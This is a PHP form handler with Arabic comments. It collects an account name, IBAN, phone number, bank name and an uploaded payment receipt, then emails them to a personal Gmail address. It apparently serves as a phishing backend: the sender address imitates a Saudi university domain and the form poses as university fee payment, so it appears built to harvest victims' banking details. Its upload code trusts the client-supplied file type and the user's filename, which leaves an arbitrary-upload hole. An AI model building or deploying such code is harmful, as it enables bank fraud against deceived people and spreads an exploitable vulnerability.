<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $accountName = $_POST['accountName'];
    $iban = $_POST['iban'];
    $phone = $_POST['phone'];
    $bankName = $_POST['bankName'];

    // إعدادات البريد
    $to = "web86598@gmail.com"; // استبدل هذا بعنوان بريدك الإلكتروني
    $subject = "بيانات سداد الرسوم";
    $message = "
    اسم صاحب الحساب: $accountName\n
    رقم الإيبان: $iban\n
    رقم الجوال: $phone\n
    اسم البنك: $bankName
    ";

    // معالجة إرفاق الإيصال
    if (isset($_FILES['receipt']) && $_FILES['receipt']['error'] == UPLOAD_ERR_OK) {
        $fileTmpPath = $_FILES['receipt']['tmp_name'];
        $fileName = $_FILES['receipt']['name'];
        $fileSize = $_FILES['receipt']['size'];
        $fileType = $_FILES['receipt']['type'];
        
        // تحقق من نوع الملف
        $allowedFileTypes = ['image/jpeg', 'image/png', 'application/pdf'];
        if (in_array($fileType, $allowedFileTypes)) {
            // نقل الملف إلى مجلد مؤقت (يمكنك تغييره حسب الحاجة)
            $uploadFileDir = './uploads/';
            $dest_path = $uploadFileDir . $fileName;

            if(move_uploaded_file($fileTmpPath, $dest_path)) {
                $message .= "\nإيصال السداد: $dest_path"; // إضافة مسار الإيصال إلى الرسالة
            } else {
                echo "<p style='color: red; text-align: center;'>فشل في تحميل إيصال السداد.</p>";
                exit;
            }
        } else {
            echo "<p style='color: red; text-align: center;'>نوع الملف غير مدعوم. يرجى إرفاق صورة أو PDF.</p>";
            exit;
        }
    }

    $headers = "From: kssu.edu.sa@gmail.com"; // استبدل باسم نطاقك إذا كان لديك واحد

    if (mail($to, $subject, $message, $headers)) {
        echo "<p style='color: green; text-align: center;'>تم إرسال البيانات بنجاح!</p>";
    } else {
        echo "<p style='color: red; text-align: center;'>فشل إرسال البيانات.</p>";
    }
}
?>


